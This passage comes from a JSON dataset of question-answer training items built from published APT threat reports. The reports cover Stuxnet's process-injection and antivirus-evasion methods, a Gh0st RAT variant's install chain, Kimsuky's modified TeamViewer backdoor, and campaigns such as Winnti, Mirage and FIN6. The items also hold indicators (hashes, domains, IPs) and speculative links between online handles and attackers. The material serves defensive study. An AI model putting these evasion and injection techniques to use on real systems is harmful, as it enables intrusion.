    "output": "Lookout leverages the largest dataset of mobile code in existence to power its cybersecurity platform. This extensive dataset allows Lookout to maintain the security platform of record for mobile device integrity and data access. By analyzing this vast amount of mobile code, Lookout can identify anomalies and potential threats, enhancing its ability to detect and mitigate sophisticated cyber-espionage campaigns like those conducted by Dark Caracal. This capability is crucial for protecting the hundreds of millions of individuals, enterprises, and government agencies that trust Lookout, ensuring the integrity of their mobile devices and the security of their data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Bypassing Behavior Blocking When Loading DLLs\nWhenever Stuxnet needs to load a DLL, including itself, it uses a special method designed to bypass behavior-blocking and host intrusion-protection based technologies that monitor LoadLibrary calls. Stuxnet calls Load-Library with a specially crafted file name that does not exist on disk and normally causes LoadLibrary to fail. However, W32.Stuxnet has hooked Ntdll.dll to monitor for requests to load specially crafted file names. These specially crafted filenames are mapped to another location instead\u2014a location specified by W32.Stuxnet. That location is generally an area in memory where a .dll file has been decrypted and stored by the threat previously. The filenames used have the pattern of KERNEL32.DLL.ASLR.[HEXADECIMAL] or SHELL32.DLL.ASLR. [HEXADECIMAL], where the variable [HEXADECIMAL]is a hexadecimal value.\nThe functions hooked for this purpose in Ntdll.dll are:\n\u2022 ZwMapViewOfSection\n\u2022 ZwCreateSection\n\u2022 ZwOpenFile\n\u2022 ZwCloseFile\n\u2022 ZwQueryAttributesFile\n\u2022 ZwQuerySection\nOnce a .dll file has been loaded via the method shown above, GetProcAddress is used to find the address of a specific export from the .dll file and that export is called, handing control to that new .dll file.\nMedium Headline: Injection Technique\nWhenever an export is called, Stuxnet typically injects the entire DLL into another process and then just calls the particular export. Stuxnet can inject into an existing or newly created arbitrary process or a preselected trusted process. When injecting into a trusted process, Stuxnet may keep the injected code in the trusted process or instruct the trusted process to inject the code into another currently running process.\nThe trusted process consists of a set of default Windows processes and a variety of security products. The currently running processes are enumerated for the following:\n\u2022 Kaspersky KAV (avp.exe)\n\u2022 Mcafee (Mcshield.exe)\n\u2022 AntiVir (avguard.exe)\n\u2022 BitDefender (bdagent.exe)\n\u2022 Etrust (UmxCfg.exe)\n\u2022 F-Secure (fsdfwd.exe)\n\u2022 Symantec (rtvscan.exe)\n\u2022 Symantec Common Client (ccSvcHst.exe)\n\u2022 Eset NOD32 (ekrn.exe)\n\u2022 Trend Pc-Cillin (tmpproxy.exe)\nIn addition, the registry is searched for indicators that the following programs are installed:\n\u2022 KAV v6 to v9\n\u2022 McAfee\n\u2022 Trend PcCillin\nIf one of the above security product processes are detected, version information of the main image is extracted. Based on the version number, the target process of injection will be determined or the injection process will fail if the threat considers the security product non-bypassable.\nThe potential target processes for the injection are as follows:\n\u2022 Lsass.exe\n\u2022 Winlogon.exe\n\u2022 Svchost.exe\n\u2022 The installed security product process\nTable 5 describes which process is used for injection depending on which security products are installed. In addition, Stuxnet will determine if it needs to use one of the two currently undisclosed privilege escalation vulnerabilities before injecting. Then, Stuxnet executes the target process in suspended mode.\nA template PE file is extracted from itself and a new section called .verif is created. The section is made large enough so that the entry point address of the target process falls within the .verif section. At that address in the template PE file, Stuxnet places a jump to the actual desired entry point of the injected code. These bytes are then written to the target process and ResumeThread is called allowing the process to execute and call the injected code.\nThis technique may bypass security products that employ behavior-blocking.\nIn addition to creating the new section and patching the entry point, the .stub section of the wrapper .dll file (that contains the main .dll file and configuration data) is mapped to the memory of the new process by means of shared sections. So the new\nprocess has access to the original .stub section. When the newly injected process is resumed, the injected code unpacks the .dll file from the mapped .stub section and calls the desired export.\nInstead of executing the export directly, the injected code can also be instructed to inject into another arbitrary process instead and within that secondary process execute the desired export.\nMedium Headline: Configuration Data Block\nThe configuration data block contains all the values used to control how Stuxnet will act on a compromised computer. Example fields in the configuration data can be seen in the Appendix.\nWhen a new version of Stuxnet is created (using the main DLL plus the 90h-byte data block plus the configuration data), the configuration data is updated, and also a computer description block is appended to the block (encoded with a NOT XOR 0xFF). The computer description block contains information such as computer name, domain name, OS version, and infected S7P paths. Thus, the configuration data block can grow pretty big, larger than the initial 744 bytes.\nThe following is an example of the computer description block :\n5.1 - 1/1/0 - 2 - 2010/09/22-15:15:47 127.0.0.1, [COMPUTER NAME] [DOMAIN NAME] [c:\\a\\1. zip:\\proj.s7p]\nThe following describes each field:\n5.1 - Major OS Version and Minor OS Version\n1/1/0 \u2013 Flags used by Stuxnet\n2 \u2013 Flag specifying if the computer is part of a workgroup or domain\n2010/09/22-15:15:47 \u2013 The time of infection.\n127.0.0.1 \u2013 Up to IP addresses of the compromised computer (not in the June 2009 version).\n[COMPUTER NAME] \u2013 The computer name.\n[DOMAIN NAME] \u2013 The domain or workgroup name.\n[c:\\a\\1.zip:\\proj.s7p] \u2013 The file name of infected project file.\n\nQuestion: Describe the injection technique used by Stuxnet to execute its code within trusted processes. What are the potential target processes and how does Stuxnet determine which process to inject into?\n\nAnswer:",
    "output": "Stuxnet uses a complex injection technique to execute its code within trusted processes. It can inject into an existing or newly created arbitrary process or a preselected trusted process. The trusted processes include a set of default Windows processes and various security products such as Kaspersky KAV, McAfee, AntiVir, BitDefender, Etrust, F-Secure, Symantec, Eset NOD32, and Trend Pc-Cillin. Stuxnet enumerates currently running processes and searches the registry for indicators of installed security products. Based on the version information of the main image, Stuxnet determines the target process for injection, which could be lsass.exe, winlogon.exe, svchost.exe, or the installed security product process. If Stuxnet considers the security product non-bypassable, the injection process fails. Before injecting, Stuxnet may use one of two undisclosed privilege escalation vulnerabilities. It then executes the target process in suspended mode, creates a new section called .verif in a template PE file, and places a jump to the desired entry point of the injected code. The .stub section of the wrapper .dll file is mapped to the memory of the new process, allowing it to access the original .stub section. When the newly injected process is resumed, it unpacks the .dll file from the mapped .stub section and calls the desired export.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Installation\nThe binary we found was dropped by a malicious Word document. The following alarms are triggered in the sandbox:\nThe shellcode contained in the Word file drops the following file, and executes it:\n- C:\\Documents and Settings\\<User>\\Local Settings\\Temp\\svohost.exe\nThis one drops in turn the following file:\n1\n2 MD5 hash: 0567fd7484efbae502cac279d32ed518\nThis tmp file is then copied to \"C:\\Windows\\system32\\Nwsapagentex.dll\" and registered as a service called \"Nwsapagent\".\nThis malware is a variant of the infamous Gh0st RAT 1 . Our specific sample uses \"ssss0\" instead of the usual \"Gh0st\" header for network communications.\nSmall Headline: Command & Control\nThe commands ID used in the communication protocol have also changed, but the features are quite the same.\nThe configuration is directly embedded in the binary, and deciphered at runtime. Up to 5 c&c servers can be configured, but our sample only had one: \"ey.avstore.com.tw:53\".\n\"EY\" could stand for \"Ernst & Young\". It would not be very surprising, since a lot of different attack groups do use anti-virus vendors or other big company's names to try to look more legitimate. Pitty Tiger is no exception, as detailed later in this report.\nWe also found two c&c binaries, claiming to be versions 2.1 and 2.2 of the Paladin RAT controller. Version 2.1 answers to the \"ssss0\" header, while version 2.2 uses the classical \"Gh0st\" header.\nBig Headline: INFRASTRUCTURE\nOur investigation has focused on three particular c&c servers used by the group. These c&c servers, unlike the other c&cs used by the group, have been misconfigured. Once parsed and dumped, it provided us with more insight.\nWe found several domains used by the Pitty Tiger group, the most interesting ones being detailed in this chapter.\nPitty Tiger, like other APT attackers, often use anti-virus \"familiar names\" when registering domains or creating subdomains. Some examples can be avstore.com.tw, sophos.skypetm.com.tw, symantecs.com.tw, trendmicro.org.tw etc.\nBig Headline: VICTIMS\nMapping the victims of such a targeted campaign is not an easy task.\nWe have found the Pitty Tiger group to be very active against one particular private company from the defense industry and one academic network of a government, , yet we think it was done to be used as a proxy for some of the group's operations.\nWe have also found some connections from other companies to the c&c servers, yet we did not find evidence that they were real victims.\nThese alleged victims do work in different sectors and are located mostly in European countries.\n\uf0b7 1 company from the defense industry;\n\uf0b7 1 company from the energy industry;\n\uf0b7 1 company from the telecommunications industry;\n\uf0b7 1 company specialized in web development.\nIt might be surprising to see a company specialized in web development here, yet it has built websites for interesting potential targets. We suspect Pitty Tiger to use this compromise to spear phish other companies which are in commercial relation with this web development company.\nWe have to mention that we only had access to three of the several attackers' servers. Therefore, we suppose the Pitty Tiger group could have more targets than what we could confirm.\nWe also found a lot of vulnerability scanners launched by the attackers at different targets, yet there was no sign of compromise.\nDuring the course of our investigations, we discovered a RAR archive on the attacker's server containing 5 Word documents and one small C source code. These documents belong to the defense company which has been compromised. According to the name of the files and the general feel of the archive, we do think it was extracted by the attackers to \"show\" someone what kind of data they could get from the compromise of that particular target. The documents were still exhibiting comments from various users, showing it was an ongoing work and not old documents.\nInterestingly enough, we saw a part of these documents appear on Virus-Total, with an additional \"gift\" from the attackers, a payload dropping a malware.\nThere are only two options we can think of here:\n\uf0b7 Someone from the same company has been targeted with this document.\n\uf0b7 Someone from another company has been targeted with this document. This other company could be a partner or competitor.\nSince we were unable to determine the intended use of this specific document, we can only suppose that it could be used to provide commercial advantages to competitors of that company, or used by a foreign state.\nMedium Headline: ATTACKER'S CONNECTIONS TO THE C&C\nWe have been able to get all the RDP connections logs to one c&c server:\nRDP connections from attackers machines to one particular c&c, from beginning of April 2014 to beginning of July 2014\nThese connections are either VPS or dynamic IP addresses, mostly from China.\nA computer named CHMXY-PC connected to the c&c via RDP with IP address 58.61.40.5. The IP is in an ADSL dynamic pool in the Gangzhou area (Guangdong province):\nA few connections to the c&c were done by a computer named TIEWEISHIPC with IP address 27.16.139.143. This IP address belongs to an ADSL dynamic pool in the Wuhan area (Hubei's provincial capital).\nSome connections to the c&c originated from a computer named FLY-THINK with several IP addresses, all located in Fuqing (Fujian province). The IP addresses are in an ADSL dynamic pool:\nMost of the connections to the c&c server were coming from a computer named 50PZ80C1DFDCB8 with several IP addresses. There are 11 IP addresses from Chinese dynamic ADSL ranges: 9 from Fuqing (Fujian province), one from Fuzhou (Fujian's province capital) and one from Nanchang (Jiangxi's province capital). The last one came from a VPS instance located in Los Angeles (California, USA) but purchased by a China based VPS provider XeVPS which belong to the AS38197 (Sun Network Hong Kong Limited).\nIP addresses used by the 50PZ80C-1DFDCB8 machine\nPublic release\nThe two computers FLY-THINK and 50PZ80C-1DFDCB8 have used distinct IP addresses to connect to the c&c, yet some of these IP addresses come from the same IP range:\nWe mapped these RDP connections to have a graphical view:\n\nAnswer this question based on the above context: How does the Pitty Tiger group's malware installation process work, starting from the initial infection vector? Explain the steps involved and the significance of each step.",
    "output": "The Pitty Tiger group's malware installation begins with a malicious Word document that drops a binary file. This file, once executed, drops another file named 'svohost.exe' in the user's temporary directory. The 'svohost.exe' file then drops a temporary file with the MD5 hash 0567fd7484efbae502cac279d32ed518, which is subsequently copied to 'C:\\\\Windows\\\\system32\\\\Nwsapagentex.dll' and registered as a service called 'Nwsapagent'. This malware is identified as a variant of the Gh0st RAT, using a custom header 'ssss0' for network communications instead of the usual 'Gh0st' header.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Yang Individual Activity\nWe have located another individual calling himself Yang. He distributed bot control commands and was quite active on the internet as well.\nSearch for \"yang8559420\" brought some results:\nYang is a distributor of resources (maps or programs) for applications based on ArcGIS Engine ()\nYang offered ArcGIS engine sourcecode for sale\nInformation about the seller:\nYang8559420 trader profile (Chinese)\nYang8559420 trader profile (English Google-translation)\nYang is certified at alipay.com (see field \"Certification\" above):\nAlipay certification\nYang left some feedback about a coat:\nYang comments on the internet (private life related)\nYang is selling glasses:\nGlasses for sale by Yang\nUser: lovemeyang (probably related to Yang). Signature is a message for a bot:\nAnother message for bot by lovemeyang\nSo, both Yang8559420 and Lovemeyang messages go with signature:\nSame signature used by Yang8559420 and Lovemeyang\n\u2026\nSignature by Lovemeyang\nSearch for \"lovemeyang\" returned too much data, making it difficult tofilter out those identifying possible attackers \u2013 false positives are highly-probable. However, it's worth mentioning that the following link refers to an account\nwith the \"lovemeyang\" username and the user has earlier posted blogs relating to IT-security, so possibly the user is that Yang who is involved in the attack:\nYang and relation to a malware\nBig Headline: Conclusions\nOur research revealed long-term oriented large scale cyber-espionage campaign of a criminal group with Chinese origins. These attacks are not new, many other security researchers have published details of various cybercriminal groups coming from China. However, the current hacking group has distinguishable features that make it stand out among others:\n- Massive abuse of digital signatures; the attackers used digital signatures of one victim company to attack other companies and steal more digital certificates;\n- Usage of kernel level 64-bit signed rootkit;\n- Abusing great variety of public Internet resources to store control commands for the malware in an encrypted form;\n- Sharing/selling stolen certificates to other groups that had different objectives (attacks against Uyghur and Tibetan activists);\n- Stealing source code and other intellectual property of software developers in online gaming industry.\nThe Winnti hacking group is not the first and not the last. By making our research paper available to the public, we hope that it will not only spread the knowledge among security researchers but also will help system administrators and security officials in all type of organizations around the world to learn the tactics and tools of the perpetrators. We hope that our shared knowledge will help to better protect IT infrastructure. We also hope that our message will reach Chinese law enforcement agencies. If the current research is not enough to initiate criminal investigation, we hope that it will be enough at least to make some checks and probably prevent other malicious activity from reaching out foreign countries and business within China.\n\nWhat unique characteristics of the Winnti group's tactics set them apart from other cybercriminal groups, and how can understanding these characteristics help in defending against similar attacks?",
    "output": "A: The Winnti group distinguished themselves through several unique tactics: massive abuse of digital signatures, usage of kernel-level 64-bit signed rootkits, abusing a variety of public internet resources to store control commands for malware in an encrypted form, sharing/selling stolen certificates to other groups with different objectives, and stealing source code and intellectual property from the online gaming industry. Understanding these characteristics helps cybersecurity professionals to recognize the advanced nature of these attacks and implement specific defenses. This includes enhanced monitoring of digital certificates, deploying advanced threat detection systems capable of identifying rootkits, securing public internet resources, and strengthening protections around valuable intellectual property.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Distribution vector\nBased on the data collected by the CTU research team, the campaign's primary attack vector is spearphishing email that targets mid-level to senior-level executives. These emails contain an attachment that includes a malicious payload that installs a copy of Mirage.\nCTU researchers have identified several files that drop and execute a copy of Mirage onto a target system. These \"droppers\" are designed to look and behave like PDF documents. However, the droppers are stand-alone executable files that open an embedded PDF file and execute the Mirage trojan. In one example, CTU researchers observed an executable file (MD5 hash ce1cdc9c95a6808945f54164b2e4d9d2) that upon execution (<http://www.yobserver.com/front-page/10021095.html>)drops a copy of Mirage and opens an embedded PDF of a news story titled \"Yemeni Women can participate in politics just like men, says President Saleh\" that was posted on the Yemen Observer's website.\n\nIn the Mirage Campaign, how does the use of droppers disguised as PDF documents enhance the effectiveness of the spearphishing attack? Explain the technical mechanism behind this approach and its implications for cybersecurity professionals.",
    "output": "The Mirage Campaign primarily uses spearphishing emails targeting mid-level to senior-level executives. These emails contain attachments that appear to be PDF documents but are actually stand-alone executable files known as 'droppers.' These droppers are designed to open an embedded PDF file while simultaneously executing the Mirage trojan. For instance, one such executable file (with MD5 hash ce1cdc9c95a6808945f54164b2e4d9d2) drops a copy of Mirage and opens a news story titled 'Yemeni Women can participate in politics just like men, says President Saleh,' which was posted on the Yemen Observer's website. This technique enhances the effectiveness of the attack by deceiving the recipient into believing they are opening a legitimate document, thereby increasing the likelihood of successful infection. For cybersecurity professionals, this highlights the importance of educating users about the risks associated with email attachments and implementing robust detection mechanisms to identify and block such sophisticated threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Operation Oil Tanker: The Phantom Menace.\nEverything started on a cold January day in a coastal town in the North East of England, an area with a strong presence of petrochemical companies.\nThe day began normally in one of these companies, a firm specializing in, among other things, maritime oil transportation. Let's call this company \"Black Gold\".\nJohn, the head of Black Gold's IT Department knows that we live in a dangerous world, and that companies face thousands of cyber-attacks every day.  And although Black Gold is not included in the Fortune 1000 company list, John knew that taking all possible safety precautions is a must and that, in addition to having a corporate antivirus, they must maximize all other security measures.\nThat's why when given the opportunity to take part in a pilot program involving a new service that monitors all applications running on endpoints, reporting the security status of the network and providing forensic information in the event of infections, he didn't think twice. After completing a series of controlled tests, John decided to deploy the small agent across the company's network October 2013.\nThe information he received during the first three months helped to identify computers at risk where vulnerable applications were found. Apart from that, nothing worth mentioning really happened.\nOne day, however, while Susan, a secretary with more than 20 years of experience at Black Gold, was checking her email as she did every Monday morning, she came across an email message with an attached document.\nThe document appeared to be a PDF file of approximately 4MB in size, with information about the oil market. Nothing suspicious.  Besides, the message in question had gone through every security filter in place. Neither the mail server antivirus nor the antivirus on her workstation had found anything anomalous in it.\nSusan double-clicked the attachment. A blank PDF opened. \"This must be a mistake. I hope they realize it and send us the correct file again,\" Susan thought, moving on to the next unread message.\nMeanwhile, 1,700 km away from Susan's computer, an alarm was triggered. An unknown threat had just been detected and blocked when it tried to steal credentials from Susan's computer and send them out.\nToday, most computer threats are designed to steal information from target systems, so this just looked like thousands of cases we examine in the laboratory every day. However, it caught our attention that no antivirus engine had been able to detect it, although this shouldn't be so surprising if you take into consideration that every day over 250,000 new malware files are put in circulation. There was something really unique about this threat: it didn't use any kind of malware. That's why we decided to call it the 'Phantom Menace'.\nSusan just clicked twice, and the 'Phantom Menace' was triggered.\nAnswer this question: Why was the 'Phantom Menace' attack particularly challenging to detect for traditional antivirus solutions? Explain the unique characteristics that made it evade detection.",
    "output": "The 'Phantom Menace' attack was particularly challenging to detect for traditional antivirus solutions because it did not use any kind of conventional malware. This unique characteristic allowed it to bypass standard security filters, including the mail server antivirus and the antivirus on the workstation. The attack was designed to steal information from target systems without triggering alarms from antivirus engines, which typically rely on identifying known malware signatures. This stealthy approach is what made the 'Phantom Menace' so elusive and difficult to detect using traditional methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the headquarters component (netsat.exe) of the malware system manage its Command and Control (C2) functionality? Explain the process and the encryption method used.",
    "output": "The headquarters component (netsat.exe) retrieves commands from an encrypted file named netwn.drv located in the CSIDL_WINDOWS\\\\msagent\\\\ directory. The encryption method used is a Tiny Encryption Algorithm (TEA) implementation, which modifies the key during encryption and decryption operations. The command file format includes the first three bytes as unknown utility, the next 16 bytes as the encryption key, bytes 20 and 21 as the command data size, and bytes 22-37 as the encrypted command data. The command format consists of drive identification followed by one or more command and parameter strings.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Lazarus APT group employ Defense Evasion techniques to bypass security mechanisms in their latest campaign?",
    "output": "Defense Evasion refers to the techniques used by adversaries to avoid detection throughout their compromise. In the case of the Lazarus APT group, they have been observed employing several new techniques to bypass detections in their latest campaign. Specifically, they utilize the KernelCallbackTable to hijack the control flow and shellcode execution, leveraging the Windows Update client for malicious code execution, and using GitHub for C2 communication. These techniques demonstrate a clear intent to evade security mechanisms and avoid detection, which is a hallmark of Defense Evasion. By abusing trusted processes and using novel methods to execute malicious code, the Lazarus APT group is able to subvert defenses and remain undetected. Furthermore, the use of GitHub for C2 communication adds an additional layer of complexity to their operations, making it more challenging for security teams to detect and mitigate their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: THE YEAR IN FIGURES\n\u2022 In 2015 one or more malware attacks were blocked on 58% of corporate computers. This is a 3 p.p. rise on the previous year.\n\u2022 29% of computers \u2013 i.e. almost every third business-owned computer \u2013 were subjected to one or more web-based attacks.\n\u2022 Malware exploiting vulnerabilities in office applications were used 3 times more often than in attacks against home users.\n\u2022 File antivirus detection was triggered on 41% of corporate computers (objects were detected on computers or on removable media connected to computers: flash drives, memory cards, telephones, external hard drives, or network disks).\nBig Headline: TARGETED ATTACKS ON BUSINESSES: APT AND CYBERCRIMINALS\n2015 saw a number of APT attacks launched against businesses. The toolkits and methods used were very similar to those we observed when analyzing earlier APT attacks, but it was cybercriminals rather than state-sponsored groups who were behind the attacks. The methods used may not be characteristic of cybercriminals, but the main aim of their attacks remained the same: financial gain.\nThe  campaign became a vivid example of how APT-class targeted attacks have shifted focus to financial organizations. The campaign was one of bona fide bank robberies in the digital age: the cybercriminals penetrated a bank's network looking for a critical system, which they then used to siphon off money. After stealing a hefty sum (anywhere between $2.5 million and $10 million) from a bank, they moved on to the next victim.\nMost of the organizations targeted were located in Eastern Europe. However, the Carbanak campaign has also targeted victims in the US, Germany and China. Up to 100 financial institutions have been affected across the globe, and the total losses could be as a high as $1 billion.\nIt shouldn't be forgotten that information can also be of great value, especially if it can be used when making deals or trading on the stock exchange, be it in commodities, securities or currency markets, including cryptocurrency markets. One example of a targeted attack that may have been hunting for such information is Wild Neutron (aka Jripbot and Morpho). This cyber-espionage campaign first  when it affected several reputable companies, including Apple, Facebook, Twitter and Microsoft. After these incidents received widespread publicity the actors behind the cyberespionage campaign suspended their activities. However, about a year later Kaspersky Lab observed that Wild Neutron had resumed operations.\nOur research has shown that the cyberespionage campaign caused infections on user computers in 11 countries and territories, namely Russia, France, Switzerland, Germany, Austria, Slovenia, Palestine, the United Arab Emirates, Kazakhstan, Algeria and the US. The victims included law firms, investment companies, bitcoin-related companies, enterprises and business groups involved in M&A deals, IT companies, healthcare companies, real estate companies, as well as individual users.\nIt should be noted that Wild Neutron used a code signing certificate stolen from Acer.\nStolen Acer certificate in the Wild Neutron installer\nThe trend towards the diversification of APT attacks is well illustrated by the change in targets attacked by the Chinese cybercriminal group . It was a long-held belief that Winnti only attacked computer gaming companies. However, in autumn 2015 evidence began to emerge that showed the group had performed a test run of their tools and methods and were trying to make money by attacking new targets. Their attention is no longer limited to the entertainment industry, with recent targets\nincluding pharmaceutical and telecom companies. Analysis of the new wave of Winnti attacks has revealed that (as with Wild Neutron) the Winnti rootkit was signed with a stolen certificate that belonged to a division at a major Japanese conglomerate.\nAnother development in 2015 was the expanding geographies of both the attacks and the attackers. For example, when Kaspersky Lab experts were investigating a Middle East incident, they came across activity by a previously unknown group conducting targeted attacks. The group, dubbed the , is the first Arab actor to conduct full-blown cyberespionage attacks. At the time the group was detected, its victims numbered around 300, including financial organizations.\nAnother group named  attacked organizations and companies in Japan:\nInformation about targeted attacks on businesses is available in the following Kaspersky Lab reports: , , , , , , . More detailed research results are provided to subscribers of the .\nAnalysis of these attacks has identified several trends in the evolution of targeted attacks on businesses:\n\u2022 Financial organizations such as banks, funds and exchange-related companies, including cryptocurrency exchanges, have been subjected to attacks by cybercriminals.\n\u2022 The attacks are meticulously planned. The cybercriminals scrutinize the interests of potential victims (employees at the targeted company), and identify the websites they are most likely to visit; they examine the targeted company's contacts, equipment and service providers.\n\u2022 The information collected at the preparation stage is then put to use. The attackers hack legitimate websites that have been identified and the business contact accounts of the targeted company's employees. The sites and accounts are used for several hours to distribute malicious code, after which the infection is deactivated. This means the cybercriminals can re-use the compromised resources again later.\n\u2022 Signed files and legitimate software is used to collect information from the attacked network.\n\u2022 Attacks are diversifying to include small and medium-sized businesses.\n\u2022 The geography of attacks on businesses is expanding: a massive attack occurred in Japan, the emergence of new APT groups in Arab countries.\nAlthough there are relatively few APT attacks launched by cybercriminals, the way they are developing will undoubtedly influence the methods and approaches employed by other cybercriminals in their operations against businesses.\nBig Headline: STATISTICS\nThe statistics for corporate users (including the geography of attacks and ratings for detected objects) tend to coincide with those for home users. This is unsurprising because business users do not exist in an isolated environment and their computers are targeted by cybercriminals who spread malware irrespective of the nature of the target. These types of attacks and malware constitute the majority, while attacks specifically targeting business users have little impact on the overall statistics.\nIn 2015, one or more malware attack was blocked on 58% of corporate user computers, which is a 3 p.p. rise on last year.\nSmall Headline: TOP 10 web-based malicious programs\nPlease note that this ranking includes malicious programs only, and no adware. Although intrusive and annoying for users, adware does not cause any damage to a computer.\n* These statistics represent the detection verdicts of the web antivirus module. Information was provided by users of Kaspersky Lab products who consented to share their local statistical data.\n** The percentage of all web attacks recorded on the computers of unique users.\nThis Top 10 consists almost exclusively of verdicts assigned to malicious objects that are used in drive-by attacks \u2013 Trojan downloaders and exploits.\nSmall Headline: TOP 10 malicious programs detected on user computers\nThis ranking includes malicious programs only, and no adware. Although intrusive and annoying for users, adware does not cause any damage to a computer.\n* These statistics are compiled from malware detection verdicts generated by the on-access and on-demand scanner modules on the computers of those users running Kaspersky Lab products who have consented to submit their statistical data.\n** The proportion of individual users on whose computers the antivirus module detected these objects as a percentage of all attacked individual users.\nFirst place is occupied by various malicious programs that were detected with the help of cloud technologies, and assigned the umbrella verdict of 'DangerousObject.Multi.Generic'. Cloud technologies work when antivirus databases do not yet contain signatures or heuristics to detect a malicious program but the company's cloud antivirus database already includes information about the object. When a client company cannot send statistics to the cloud, Kaspersky Private Security Network is used instead, meaning that network computers receive protection from the cloud.\nMost of the remaining positions in the ranking are occupied by self-propagating malware programs and their components.\nBig Headline: CHARACTERISTICS OF ATTACKS ON BUSINESSES\nThe overall statistics for corporate users do not reflect the specific attributes of attacks launched against businesses; the stats are influenced more by the probability of a computer infection in a country, or by how popular a specific malware program is with cybercriminals.\nHowever, a more detailed analysis reveals the peculiarities of attacks on corporate users:\n\u2022 exploits for vulnerabilities found in office applications are used three times more often than in attacks on home users;\n\u2022 use of malicious files signed with valid digital certificates;\n\u2022 use of legitimate programs in attacks, allowing the attackers to go undetected for longer.\nWe have also observed a rapid growth in the number of corporate user computers attacked by encryptor programs.\nIn this particular context, the majority of cases are not APT attacks: \"standard\" cybercriminals are simply focusing on corporate users, and sometimes on a particular company that is of interest to them.\n\nHow did the Carbanak campaign demonstrate the shift in focus of APT-class targeted attacks towards financial organizations?",
    "output": "The Carbanak campaign exemplified the shift in focus of APT-class targeted attacks towards financial organizations by penetrating banks' networks to siphon off significant amounts of money, anywhere between $2.5 million and $10 million per bank. The campaign targeted up to 100 financial institutions globally, resulting in total losses potentially reaching $1 billion. The primary motive remained financial gain, with most targets located in Eastern Europe, although victims were also identified in the US, Germany, and China.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6\nReports on payment card intrusions and theft are often fragmentary. The focus is on various pieces of the attack and less about capturing the end-to-end cycle of compromise, data theft, illicit sale and use. The full scope of attacker activity traditionally occurs beyond the view of any one group of investigators. Incident response teams may have visibility into the technical aspects of the breach itself, while cyber crime researchers monitor the movement and sale of stolen data in the criminal underground.\nFireEye Threat Intelligence and iSIGHT Partners recently combined our research to illuminate the activities of one particular threat group: FIN6. This combined insight has provided unique and extensive visibility into FIN6's operations, from initial intrusion to the methods used to navigate the victims' networks to the sale of the stolen payment card data in an underground marketplace. In this report, we describe FIN6's activities and tactics, techniques and procedures (TTPs), and provide a glimpse into the criminal ecosystem that supports the \"payoff\" for their operations.\n\nAnswer this question based on the above context: How does the combined research by FireEye Threat Intelligence and iSIGHT Partners contribute to a comprehensive understanding of FIN6's operations, and what specific insights does it provide into the group's tactics, techniques, and procedures (TTPs)?",
    "output": "The combined research by FireEye Threat Intelligence and iSIGHT Partners offers a holistic view of FIN6's operations by integrating different perspectives. Incident response teams typically focus on the technical aspects of the breach, while cyber crime researchers track the movement and sale of stolen data in the criminal underground. By merging these insights, the research provides extensive visibility into FIN6's activities, starting from the initial intrusion, through the navigation of victims' networks, to the eventual sale of stolen payment card data in underground marketplaces. This comprehensive approach allows for a detailed description of FIN6's TTPs, offering a glimpse into the criminal ecosystem that supports the financial gains from their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Remote control module downloader\nAn extra program is dedicated exclusively to download attachments out of incoming e-mails with a particular subject tag. This program is similar to the pivot module but with reduced functionality: it maintains the hardcoded Bulgarian e-mail account, logs in, reads incoming e-mails and searches for the special subject tag \"Team\". When found, it loads the related attachment, drops it onto the hard drive as C:Program FilesCommon FilesSystemOle DBtaskmgr.exe and executes. This particular executable arrives without any encryption.\nBig Headline: Remote control module\nIt is also interesting that the malware author did not custom develop a backdoor program. Instead, the author modified TeamViewer client version 5.0.9104. The initial executable pushed by attackers in e-mails related to the remote control module consists of three more executables. Two of them are Team Viewer components themselves, and another is some sort of backdoor loader. So, the dropper creates three files in the C:WindowsSystem32 directory:\nnetsvcs.exe - the modified Team Viewer client; netsvcs_ko.dll - resources library of Team Viewer client; vcmon.exe - installer/starter;\nand creates the service \"Remote Access Service\", adjusted to execute C:WindowsSystem32vcmon.exe at\nsystem startup. Every time the vcmon.exe is executed, it disables AhnLab's firewall by zeroing out following registry values:\nHKLMSOFTWAREAhnLabV3 365 ClinicInternetSec\nThen, it modifies the Team Viewer registry settings. As we said, the Team Viewer components used in this campaign are not the original ones. They are slightly modified. In total, we found two different variants of changed versions. The malware author replaced all the entries of \"Teamviewer\" strings in Team Viewer components. In the first case with the \"Goldstager\" string and with the string \"Coinstager\" in the second. TeamViewer client registry settings are then HKLMSoftwareGoldstagerVersion5 and HKLMSoftwareCoinstagerVersion5 correspondingly. The launcher sets up several registry values that control how the remote access tool will work. Among them is SecurityPasswordAES. This parameter represents a hash of the password with which a remote user has to connect to Team Viewer client. This way, the attackers set a pre-shared authentication value. After that, the starter executes the very Team Viewer client netsvcs.exe.\nBig Headline: Who's Kim?\nIt's interesting that the drop box mail accounts iop110112@hotmail.com and rsh1213@hotmail.com are registered with the following \"kim\" names: kimsukyang and \"Kim asdfa\".\nOf course, we can't be certain that these are the real names of the attackers. However, the selection isn't frequently seen. Perhaps it also points to the suspected North Korean origin of attack. Taking into account the profiles of the targeted organizations -- South Korean universities that conduct researches on international affairs, produce defense policies for government, national shipping company, supporting groups for Korean unification -- one might easily suspect that the attackers might be from North Korea.\nThe targets almost perfectly fall into their sphere of interest. On the other hand, it is not that hard to enter arbitrary registration information and misdirect investigators to an obvious North Korean origin. It does not cost anything to concoct fake registration data and enter kimsukyang during a Hotmail registration. We concede that this registration data does not provide concrete, indisputable information about the attackers.\nHowever, the attackers' IP-addresses do provide some additional clues. During our analysis, we observed ten IP-addresses used by the Kimsuky operators. All of them lie in ranges of the Jilin Province Network and Liaoning Province Network, in China.\nNo other 